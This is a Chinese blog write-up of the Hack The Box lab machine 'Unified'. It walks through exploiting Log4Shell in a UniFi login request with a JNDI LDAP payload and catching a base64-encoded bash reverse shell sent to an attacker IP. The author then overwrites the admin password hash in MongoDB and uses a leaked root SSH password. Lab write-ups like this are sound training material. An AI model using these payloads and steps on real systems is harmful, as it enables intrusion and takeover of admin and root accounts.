---
title: 记模拟渗透-HTB-Tier2-4
published: 2022-03-29
description: "Hack The Box Tier2-4 Writeup."
# image: "./cover.webp"
tags: ["网络安全","Hack The Box", "靶场"]
category: 网络安全
draft: false
---

db_nmap -sV 10.129.147.254<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648374246507-18f8b164-039b-40c7-a719-196d36c72ec9.png#averageHue=%23242934&clientId=u191cfb9b-534b-4&from=paste&height=255&id=u6b99050a&originHeight=255&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=82785&status=done&style=none&taskId=uf963191c-7b95-492c-854b-1da86bce9f7&title=&width=903)

发现8080是个网站，打开<br />10.129.147.254:8080<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648374867847-f1ac758f-cdce-4346-822f-ff75514dc438.png#averageHue=%230c2843&clientId=u191cfb9b-534b-4&from=paste&height=640&id=ue91c6701&originHeight=640&originWidth=1059&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67371&status=done&style=none&taskId=u3d0c5a76-8764-4e80-8ac5-969f9eec19c&title=&width=1059)

UniFi  搜一下 ：UniFi 漏洞<br />找到了相关漏洞：CVE-2021-44228<br />尝试利用。。

监听389端口<br />sudo tcpdump -i tun0 port 389<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376116980-fe8272d5-24af-471a-b705-bb56b483bf9e.png#averageHue=%23adb98b&clientId=u191cfb9b-534b-4&from=paste&height=825&id=u82c38988&originHeight=825&originWidth=1499&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206455&status=done&style=none&taskId=ud99ace80-538c-40cd-8bfb-84da7dbb838&title=&width=1499)

执行命令<br />将此命令用base64加密<br />echo 'bash -c bash -i >& /dev/tcp/10.10.16.20/12123 0>&1' | base64<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376342529-4527e17a-dbda-44ed-bb4e-d7eb8d852cfa.png#averageHue=%23282c37&clientId=u191cfb9b-534b-4&from=paste&height=158&id=u1b223c05&originHeight=158&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37704&status=done&style=none&taskId=u8795d4e2-3434-47f5-95ca-680c099420d&title=&width=664)

burpsuite抓包里添加这串内容

{<br />	"username":"admin",<br />	"password":"admin",<br />	"remember":"${jndi:ldap://10.10.16.20/test}",<br />	"strict":true<br />}

${jndi:ldap://Tun0 IP Address:1389/o=tomcat} <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376522455-a1d8a038-2437-48d1-bbfe-4e4b7fc319ce.png#averageHue=%23fcfcfc&clientId=u191cfb9b-534b-4&from=paste&height=265&id=ud74f43e7&originHeight=265&originWidth=658&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22288&status=done&style=none&taskId=u935047b8-edfc-4fa9-964c-117f722115a&title=&width=658)

sudo nc -lvnp 12123<br />监听端口<br />在此send发包<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376639985-0a16a688-27bc-4b45-af14-04ed22c7001d.png#averageHue=%2375b07b&clientId=u191cfb9b-534b-4&from=paste&height=873&id=u212555ec&originHeight=873&originWidth=1656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=239626&status=done&style=none&taskId=u423fe152-03a4-4b4e-82aa-eb53f4d5fc4&title=&width=1656)

拿到shell

用script /dev/null -c bash 来使用<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376852383-c6e8775a-8af5-4f80-9b6c-8e725dfa9116.png#averageHue=%23292b35&clientId=u191cfb9b-534b-4&from=paste&height=492&id=ubacf4a08&originHeight=492&originWidth=891&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118942&status=done&style=none&taskId=u324325b7-5562-4762-b902-bef5f2472cc&title=&width=891)

得到数据库信息 mongo数据库<br />ps aux | grep mongo <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376965387-6544aa65-a71d-48c5-9b73-6f2b64ddc9a4.png#averageHue=%232c313d&clientId=u191cfb9b-534b-4&from=paste&height=101&id=ud695881a&originHeight=101&originWidth=871&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49432&status=done&style=none&taskId=uc9852a15-2356-48b8-be5f-64ca40cff6a&title=&width=871)


通过查询，得到以下信息<br />mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)" <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648376981120-87cbbbee-edee-4c68-bde2-360686697231.png#averageHue=%232a2d37&clientId=u191cfb9b-534b-4&from=paste&height=571&id=u9b17e484&originHeight=571&originWidth=877&originalType=binary&ratio=1&rotation=0&showTitle=false&size=179033&status=done&style=none&taskId=u24cc82c9-535a-47f8-97fb-dcf5b39b05c&title=&width=877)<br />"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),<br />        "name" : "administrator",<br />        "email" : "administrator@unified.htb",<br />        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",

看到密码为

显示用sha-512加密后的密码<br />mkpasswd -m sha-512 你设定的密码<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648377529543-48fb35c4-d184-4268-a739-c29583768ac5.png#averageHue=%23282b35&clientId=u191cfb9b-534b-4&from=paste&height=255&id=u430f7c82&originHeight=255&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56273&status=done&style=none&taskId=ua65efbc5-977f-402d-b5e3-e98d4283633&title=&width=963)

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA-512 Hash Generated"}})' 

 <br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648377819163-239888f4-6b22-456c-8539-f4d88d9dd36b.png#averageHue=%232c303c&clientId=u191cfb9b-534b-4&from=paste&height=173&id=u75a7fb51&originHeight=173&originWidth=877&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65435&status=done&style=none&taskId=uc561c741-77ae-41b4-a498-6ffa96eae10&title=&width=877)

修改前Adminstrator 的x_shadow值：<br />"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),<br />        "name" : "administrator",<br />        "email" : "administrator@unified.htb",<br />        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",


修改后：<br />"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),<br />        "name" : "administrator",<br />        "email" : "administrator@unified.htb",<br />        "x_shadow" : "$6$N5j/rR78cHLEi42V$itMyy1nFi5HmeqfR9aV75vp2TXOnCIyN4zyVOW8NVlwU2H7QTqCA.aYuJY/svipLLCBsY9r5FE9eOFs9kjIHW/",


此时，Adminstrator的密码已经修改为了test1234<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648378079135-bad8f3d8-fe6e-4818-bd00-9523ebc348ef.png#averageHue=%230c2843&clientId=u191cfb9b-534b-4&from=paste&height=661&id=u13dab8fa&originHeight=661&originWidth=1150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72664&status=done&style=none&taskId=u8660be2e-397a-41f7-b1d2-c5777a8ace5&title=&width=1150)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648378332886-82d32c9e-e3e2-4428-8b28-0167ed56dc8d.png#averageHue=%23212432&clientId=u191cfb9b-534b-4&from=paste&height=804&id=u33ef7598&originHeight=804&originWidth=1281&originalType=binary&ratio=1&rotation=0&showTitle=false&size=136019&status=done&style=none&taskId=u1fa3fcf0-29cc-47a7-b369-a90e7780df0&title=&width=1281)<br />左侧设置里面最下面，发现<br />sshKeys<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648378420661-c6419432-091c-42e0-a747-2f431b74ae4d.png#averageHue=%231f2333&clientId=u191cfb9b-534b-4&from=paste&height=273&id=ua5f1af25&originHeight=273&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26421&status=done&style=none&taskId=u49807a1d-6628-4f53-bec4-47372080f42&title=&width=824)

登录ssh<br />账号：root<br />密码：NotACrackablePassword4U2022

拿到shell<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648378725083-4828c7ea-af8f-4d68-a7d8-39fabd4b9d3f.png#averageHue=%23242833&clientId=u191cfb9b-534b-4&from=paste&height=488&id=ud491c25b&originHeight=488&originWidth=869&originalType=binary&ratio=1&rotation=0&showTitle=false&size=120850&status=done&style=none&taskId=ubf780447-40a0-4165-b123-8d7ca4a90c6&title=&width=869)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1295434/1648378867591-45c3ef81-b3da-49f4-928c-894bd24e58d4.png#averageHue=%23232733&clientId=u191cfb9b-534b-4&from=paste&height=931&id=u9927391d&originHeight=931&originWidth=1649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=471309&status=done&style=none&taskId=u1bc900e0-faff-4dbf-8566-dc0056a3fd3&title=&width=1649)
